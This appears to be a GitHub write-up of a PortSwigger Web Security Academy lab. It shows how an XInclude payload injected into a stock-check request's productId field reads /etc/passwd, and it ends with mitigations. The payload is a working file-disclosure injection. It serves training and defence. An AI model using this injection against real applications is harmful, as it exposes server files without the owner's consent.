# 🛡️ Lab: Exploiting XInclude to Retrieve Files

**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
**Category:** XML External Entity (XXE)  
**Difficulty:**  Practitioner  
**Lab Goal:** Use an XInclude injection to extract the contents of the `/etc/passwd` file.


##  Steps to Reproduce

1. Go to any product page and click the **"Check stock"** button.
2. Intercept the resulting **POST request** using **Burp Suite**.
3. Modify the `productId` field to inject an `xi:include` directive.


##  Payload

```xml
<productId xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</productId>
```


## Expected Result

- The application includes the contents of `/etc/passwd` in the response.
- You should see user entries like `root:x:0:0:root:/root:/bin/bash`.

##  Key Takeaway

When classic XXE is not possible due to limited XML control, **XInclude injection** can be used as an alternative to retrieve local files, exposing sensitive system information.


##  Mitigation

- Disable XInclude processing in your XML parser configuration.
- Use secure parsers that do not resolve file-based references.
- Sanitize all user input and avoid embedding raw input into XML documents.


##  Author

`vgod-sec`   
🔗 GitHub: [https://github.com/vgod-sec](https://github.com/vgod-sec)
